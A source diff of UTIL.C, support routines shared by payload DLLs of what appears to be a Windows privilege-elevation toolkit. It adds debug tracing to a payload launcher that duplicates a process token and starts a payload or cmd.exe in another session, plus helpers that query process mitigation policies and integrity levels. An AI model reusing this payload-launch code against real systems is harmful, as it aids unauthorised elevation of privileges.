@@ -4,9 +4,9 @@
 *
 *  TITLE:       UTIL.C
 *
-*  VERSION:     2.90
+*  VERSION:     3.00
 *
-*  DATE:        10 July 2018
+*  DATE:        27 Aug 2018
 *
 *  Global support routines file shared between payload dlls.
 *
@@ -17,7 +17,39 @@
 *
 *******************************************************************************/
 
+#undef _TRACE_CALL
+
 #include "shared.h"
+
+/*
+* ucmPingBack
+*
+* Purpose:
+*
+* Does what it called.
+*
+*/
+VOID ucmPingBack(
+    VOID
+)
+{
+    HANDLE hEvent = NULL;
+    UNICODE_STRING usSignalEvent = RTL_CONSTANT_STRING(L"\\BaseNamedObjects\\CZ2128");
+    OBJECT_ATTRIBUTES obja;
+
+#ifdef _TRACE_CALL 
+    OutputDebugString(L"service>ping back\r\n");
+#endif
+
+    InitializeObjectAttributes(&obja, &usSignalEvent, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    if (NT_SUCCESS(NtOpenEvent(&hEvent, EVENT_ALL_ACCESS, &obja))) {
+#ifdef _TRACE_CALL
+        OutputDebugString(L"service>>pingback event found");
+#endif
+        NtSetEvent(hEvent, NULL);
+        NtClose(hEvent);
+    }
+}
 
 /*
 * ucmPrivilegeEnabled
@@ -75,10 +107,6 @@ NTSTATUS ucmReadValue(
 
     *Buffer = NULL;
     *BufferSize = 0;
-
-    usName.Buffer = NULL;
-    usName.Length = 0;
-    usName.MaximumLength = 0;
 
     RtlInitUnicodeString(&usName, ValueName);
     Status = NtQueryValueKey(hKey, &usName, KeyValuePartialInformation, NULL, 0, &Length);
@@ -175,7 +203,6 @@ NTSTATUS NTAPI ucmEnumSystemObjects(
 
     // We can use root directory.
     if (pwszRootDirectory != NULL) {
-        RtlSecureZeroMemory(&sname, sizeof(sname));
         RtlInitUnicodeString(&sname, pwszRootDirectory);
         InitializeObjectAttributes(&attr, &sname, OBJ_CASE_INSENSITIVE, NULL, NULL);
         status = NtOpenDirectoryObject(&hDirectory, DIRECTORY_QUERY, &attr);
@@ -744,9 +771,18 @@ BOOL ucmLaunchPayload2(
 
     ULONG                       CurrentSessionId = NtCurrentPeb()->SessionId;
 
+#ifdef _TRACE_CALL
+    WCHAR                       szDebugBuf[1000];
+#endif //_TRACE_CALL
+
     do {
 
         bSrvExec = ((bIsLocalSystem) && (CurrentSessionId != SessionId));
+
+#ifdef _TRACE_CALL
+        if (bSrvExec)
+            OutputDebugString(L"bServExec");
+#endif //_TRACE_CALL
 
         //
         // In case of service start, prepare token for CreateProcessAsUser.
@@ -759,11 +795,28 @@ BOOL ucmLaunchPayload2(
                 TOKEN_ALL_ACCESS,
                 &hToken);
 
-            if (!NT_SUCCESS(status))
+            if (!NT_SUCCESS(status)) {
+#ifdef _TRACE_CALL
+                _strcpy(szDebugBuf, L"NtOpenProcessToken = 0x");
+                ultohex(status, _strend(szDebugBuf));
+                _strcat(szDebugBuf, L"\r\n");
+                OutputDebugString(szDebugBuf);
+#endif  //_TRACE_CALL
                 break;
+            }
 
-            if (!ucmPrivilegeEnabled(hToken, SE_TCB_PRIVILEGE))
+#ifdef _TRACE_CALL
+            if (!ucmPrivilegeEnabled(hToken, SE_ASSIGNPRIMARYTOKEN_PRIVILEGE)) {
+                OutputDebugString(L"ucmPrivilegeEnabled->SE_ASSIGNPRIMARYTOKEN_PRIVILEGE not set\r\n");
+            }
+#endif //_TRACE_CALL
+
+            if (!ucmPrivilegeEnabled(hToken, SE_TCB_PRIVILEGE)) {
+#ifdef _TRACE_CALL
+                OutputDebugString(L"ucmPrivilegeEnabled->SE_TCB_PRIVILEGE not set\r\n");
+#endif //_TRACE_CALL
                 break;
+            }
 
             sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
             sqos.ImpersonationLevel = SecurityImpersonation;
@@ -780,8 +833,15 @@ BOOL ucmLaunchPayload2(
                 TokenPrimary,
                 &hDupToken);
 
-            if (!NT_SUCCESS(status))
+            if (!NT_SUCCESS(status)) {
+#ifdef _TRACE_CALL
+                _strcpy(szDebugBuf, L"NtDuplicateToken = 0x");
+                ultohex(status, _strend(szDebugBuf));
+                _strcat(szDebugBuf, L"\r\n");
+                OutputDebugString(szDebugBuf);
+#endif //_TRACE_CALL
                 break;
+            }
 
             status = NtSetInformationToken(
                 hDupToken,
@@ -789,8 +849,15 @@ BOOL ucmLaunchPayload2(
                 (PVOID)&SessionId,
                 sizeof(ULONG));
 
-            if (!NT_SUCCESS(status))
+            if (!NT_SUCCESS(status)) {
+#ifdef _TRACE_CALL
+                _strcpy(szDebugBuf, L"NtSetInformationToken = 0x");
+                ultohex(status, _strend(szDebugBuf));
+                _strcat(szDebugBuf, L"\r\n");
+                 OutputDebugString(szDebugBuf);
+#endif //_TRACE_CALL
                 break;
+            }
 
         }
         else {
@@ -805,8 +872,16 @@ BOOL ucmLaunchPayload2(
         //
         RtlSecureZeroMemory(sysdir, sizeof(sysdir));
         cch = ucmExpandEnvironmentStrings(L"%systemroot%\\system32\\", sysdir, MAX_PATH);
-        if ((cch == 0) || (cch > MAX_PATH))
+        if ((cch == 0) || (cch > MAX_PATH)) {                      
+#ifdef _TRACE_CALL
+            OutputDebugString(L"ucmExpandEnvironmentStrings failed");
+#endif //_TRACE_CALL
             break;
+        }
+
+#ifdef _TRACE_CALL
+        OutputDebugString(sysdir);
+#endif //_TRACE_CALL
 
         //
         // Query startup info from parent.
@@ -819,6 +894,10 @@ BOOL ucmLaunchPayload2(
         // Determine what we want to execute, custom parameter or default cmd.exe
         //
         if ((pszPayload) && (cbPayload)) {
+
+#ifdef _TRACE_CALL
+            OutputDebugString(L"payload present\r\n");
+#endif //_TRACE_CALL
 
             //
             // We can use custom payload, copy it to internal buffer.
@@ -887,15 +966,25 @@ BOOL ucmLaunchPayload2(
             &processInfo);
 
         if (bResult) {
-
+#ifdef _TRACE_CALL
+            OutputDebugString(L"CreateProcessAsUser success\r\n");
+#endif //_TRACE_CALL
             //
             // We don't need these handles, close them.
             //
             NtClose(processInfo.hProcess);
             NtClose(processInfo.hThread);
         }
+#ifdef _TRACE_CALL
+        else {
+            _strcpy(szDebugBuf, L"CreateProcessAsUser failed with code = 0x");
+            ultohex(GetLastError(), _strend(szDebugBuf));
+            _strcat(szDebugBuf, L"\r\n");
+            OutputDebugString(szDebugBuf);
+        }
 
-    } while (bCond);
+#endif //_TRACE_CALL
+   } while (bCond);
 
     //
     // Post execution cleanup if required.
@@ -1070,40 +1159,32 @@ LPWSTR ucmQueryRuntimeInfo(
 
                     dwIntegrityLevel = *RtlSubAuthoritySid(pTIL->Label.Sid,
                         (DWORD)(UCHAR)(*RtlSubAuthorityCountSid(pTIL->Label.Sid) - 1));
-
-                    if (dwIntegrityLevel >= SECURITY_MANDATORY_UNTRUSTED_RID &&
-                        dwIntegrityLevel < SECURITY_MANDATORY_LOW_RID)
-                    {
-                        lpValue = TEXT("UntrustedIL");
+                    
+                    if (dwIntegrityLevel == SECURITY_MANDATORY_UNTRUSTED_RID) {
+                        lpValue = L"UntrustedIL";
                     }
-                    else
-                        if (dwIntegrityLevel >= SECURITY_MANDATORY_LOW_RID &&
-                            dwIntegrityLevel < SECURITY_MANDATORY_MEDIUM_RID)
-                        {
-                            lpValue = TEXT("LowIL");
-                        }
-                        else
-                            if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID &&
-                                dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
-                            {
-                                lpValue = TEXT("MediumIL");
-                            } //skip SECURITY_MANDATORY_MEDIUM_PLUS
-                            else
-                                if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID &&
-                                    dwIntegrityLevel < SECURITY_MANDATORY_SYSTEM_RID)
-                                {
-                                    lpValue = TEXT("HighIL");
-                                }
-                                else
-                                    if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID &&
-                                        dwIntegrityLevel < SECURITY_MANDATORY_PROTECTED_PROCESS_RID)
-                                    {
-                                        lpValue = TEXT("SystemIL");
-                                    }
-                                    else
-                                        if (dwIntegrityLevel >= SECURITY_MANDATORY_PROTECTED_PROCESS_RID) {
-                                            lpValue = TEXT("ProtectedProcessIL");
-                                        }
+                    else if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
+                        lpValue = L"LowIL";
+                    }
+                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID &&
+                        dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)  //skip SECURITY_MANDATORY_MEDIUM_PLUS_RID
+                    {
+                        lpValue = L"MediumIL";
+                    }
+                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID &&
+                        dwIntegrityLevel < SECURITY_MANDATORY_SYSTEM_RID)
+                    {
+                        lpValue = L"HighIL";
+                    }
+                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID &&
+                        dwIntegrityLevel < SECURITY_MANDATORY_PROTECTED_PROCESS_RID)
+                    {
+                        lpValue = L"SystemIL";
+                    }
+                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_PROTECTED_PROCESS_RID)
+                    {
+                        lpValue = L"ProtectedProcessIL";
+                    }
 
                     _strcpy(szBuffer, TEXT("\r\nPID="));
                     ultostr((ULONG)GetCurrentProcessId(), _strend(szBuffer));
@@ -1615,7 +1696,6 @@ BOOL ucmReadParameters(
             usCurrentUserKey.Buffer = NULL;
         }
 
-        RtlSecureZeroMemory(&usValue, sizeof(usValue));
         RtlInitUnicodeString(&usValue, lpszParamKey);
         InitializeObjectAttributes(&obja, &usValue, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
@@ -1790,41 +1870,227 @@ wchar_t *sxsFilePathNoSlash(
 }
 
 /*
-* sxsFindDllCallback
+* sxsFindLoaderEntry
 *
 * Purpose:
 *
-* LdrEnumerateLoadedModules callback used to lookup sxs dlls from loader list.
+* Return loader entry filename for sxs dll.
 *
 */
-VOID NTAPI sxsFindDllCallback(
-    _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,
-    _In_ PVOID Context,
-    _In_ OUT BOOLEAN *StopEnumeration
+BOOL sxsFindLoaderEntry(
+    _In_ PSXS_SEARCH_CONTEXT Context
 )
 {
-    BOOL bCond = FALSE;
-    BOOLEAN bFound = FALSE;
-    PSXS_SEARCH_CONTEXT sctx = (PSXS_SEARCH_CONTEXT)Context;
+    NTSTATUS Status;
+    HANDLE hDll = NULL;
+    UNICODE_STRING usDll;
+
+    PLDR_DATA_TABLE_ENTRY LdrTableEntry = NULL;
+
+    RtlInitUnicodeString(&usDll, Context->DllName);
+
+    Status = LdrGetDllHandle(
+        NULL,
+        NULL,
+        &usDll,
+        &hDll);
+
+    if (NT_SUCCESS(Status)) {
+
+        Status = LdrFindEntryForAddress(
+            hDll,
+            &LdrTableEntry);
+
+        if (NT_SUCCESS(Status)) {
+
+            if (_strstri(
+                LdrTableEntry->FullDllName.Buffer,
+                L".local") == NULL)
+            {
+                if (_strstri(
+                    LdrTableEntry->FullDllName.Buffer,
+                    Context->SxsKey))
+                {
+                    sxsFilePathNoSlash(
+                        LdrTableEntry->FullDllName.Buffer,
+                        Context->FullDllPath);
+
+                }
+                else
+                    Status = STATUS_NOT_FOUND;
+            }
+            else
+                Status = STATUS_TOO_LATE;
+        }
+    }
+
+    return NT_SUCCESS(Status);
+}
+
+/*
+* ucmGetProcessMitigationPolicy
+*
+* Purpose:
+*
+* Request process mitigation policy values.
+*
+*/
+BOOL ucmGetProcessMitigationPolicy(
+    _In_ HANDLE hProcess,
+    _In_ PROCESS_MITIGATION_POLICY Policy,
+    _In_ SIZE_T Size,
+    _Out_writes_bytes_(Size) PVOID Buffer
+)
+{
+    ULONG Length = 0;
+
+    PROCESS_MITIGATION_POLICY_INFORMATION MitigationPolicy;
+
+    MitigationPolicy.Policy = (PROCESS_MITIGATION_POLICY)Policy;
+
+    if (!NT_SUCCESS(NtQueryInformationProcess(
+        hProcess,
+        ProcessMitigationPolicy,
+        &MitigationPolicy,
+        sizeof(PROCESS_MITIGATION_POLICY_INFORMATION),
+        &Length)))
+    {
+        return FALSE;
+    }
+
+    RtlCopyMemory(Buffer, &MitigationPolicy, Size);
+
+    return TRUE;
+}
+
+/*
+* ucmGetRemoteCodeExecPolicies
+*
+* Purpose:
+*
+* Request specific process mitigation policy values all at once.
+* Use RtlFreeHeap to release returned buffer.
+*
+*/
+UCM_PROCESS_MITIGATION_POLICIES *ucmGetRemoteCodeExecPolicies(
+    _In_ HANDLE hProcess
+)
+{
+    UCM_PROCESS_MITIGATION_POLICIES *Policies = NULL;
+
+    Policies = RtlAllocateHeap(
+        NtCurrentPeb()->ProcessHeap,
+        HEAP_ZERO_MEMORY,
+        sizeof(UCM_PROCESS_MITIGATION_POLICIES));
+
+    if (Policies == NULL)
+        return NULL;
+
+    ucmGetProcessMitigationPolicy(
+        hProcess,
+        ProcessExtensionPointDisablePolicy,
+        sizeof(PROCESS_MITIGATION_EXTENSION_POINT_DISABLE_POLICY),
+        &Policies->ExtensionPointDisablePolicy);
+
+    ucmGetProcessMitigationPolicy(
+        hProcess,
+        ProcessSignaturePolicy,
+        sizeof(PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_W10),
+        &Policies->SignaturePolicy);
+
+    ucmGetProcessMitigationPolicy(
+        hProcess,
+        ProcessDynamicCodePolicy,
+        sizeof(PROCESS_MITIGATION_DYNAMIC_CODE_POLICY_W10),
+        &Policies->DynamicCodePolicy);
+
+    ucmGetProcessMitigationPolicy(
+        hProcess,
+        ProcessImageLoadPolicy,
+        sizeof(PROCESS_MITIGATION_IMAGE_LOAD_POLICY_W10),
+        &Policies->ImageLoadPolicy);
+
+    ucmGetProcessMitigationPolicy(
+        hProcess,
+        ProcessSystemCallFilterPolicy,
+        sizeof(PROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY_W10),
+        &Policies->SystemCallFilterPolicy);
+
+    ucmGetProcessMitigationPolicy(
+        hProcess,
+        ProcessPayloadRestrictionPolicy,
+        sizeof(PROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY_W10),
+        &Policies->PayloadRestrictionPolicy);
+
+    return Policies;
+}
+
+/*
+* ucmQueryProcessTokenIL
+*
+* Purpose:
+*
+* Return integrity level for given process.
+*
+*/
+_Success_(return == TRUE)
+BOOL ucmQueryProcessTokenIL(
+    _In_ HANDLE hProcess,
+    _Out_ PULONG IntegrityLevel
+)
+{
+    BOOL                            bCond = FALSE, bResult = FALSE;
+    HANDLE                          hToken = NULL;
+    PTOKEN_MANDATORY_LABEL          pTIL = NULL;
+    ULONG                           Length = 0;
 
     do {
 
-        if ((DataTableEntry->BaseDllName.Buffer == NULL) ||
-            (DataTableEntry->FullDllName.Buffer == NULL))
+        if (!NT_SUCCESS(NtOpenProcessToken(
+            hProcess,
+            TOKEN_QUERY,
+            &hToken)))
+        {
             break;
+        }
 
-        if (_strcmpi(DataTableEntry->BaseDllName.Buffer,
-            sctx->DllName) != 0) break;
+        if (STATUS_BUFFER_TOO_SMALL != NtQueryInformationToken(
+            hToken,
+            TokenIntegrityLevel,
+            NULL,
+            0,
+            &Length))
+        {
+            break;
+        }
 
-        if (_strstri(DataTableEntry->FullDllName.Buffer,
-            sctx->PartialPath) == NULL) break;
+#pragma warning(push)
+#pragma warning(disable:6263 6255)
 
-        if (sxsFilePathNoSlash(DataTableEntry->FullDllName.Buffer,
-            sctx->FullDllPath) == NULL) break;
+        pTIL = (PTOKEN_MANDATORY_LABEL)_alloca(Length); //-V505
 
-        bFound = TRUE;
+#pragma warning(pop)
+
+        if (!NT_SUCCESS(NtQueryInformationToken(
+            hToken,
+            TokenIntegrityLevel,
+            pTIL,
+            Length,
+            &Length)))
+        {
+            break;
+        }
+
+        if (IntegrityLevel)
+            *IntegrityLevel = *RtlSubAuthoritySid(
+                pTIL->Label.Sid,
+                (DWORD)(UCHAR)(*RtlSubAuthorityCountSid(pTIL->Label.Sid) - 1));
+
+        bResult = TRUE;
 
     } while (bCond);
 
-    *StopEnumeration = bFound;
+    if (hToken) NtClose(hToken);
+
+    return bResult;
 }
